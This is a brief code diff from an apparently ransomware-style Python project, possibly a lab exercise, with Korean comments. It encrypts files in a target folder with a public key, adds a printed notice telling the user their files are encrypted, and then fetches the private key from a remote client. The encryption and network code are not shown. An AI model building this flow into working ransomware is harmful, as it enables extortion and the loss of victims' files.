@@ -10,6 +10,10 @@ def main():
     file_encryptor = FileEncryptor(public_key)
     file_encryptor.encrypt('./../target/*') # target 폴더 내부 암호화
 
+    print('your files have been encrypted.')
+    print('if you want to decrypt, enter any button')
+    input()
+
     private_key = client.get_key(1) # private key 가져옴
     client.stop() # 연결 종료
 
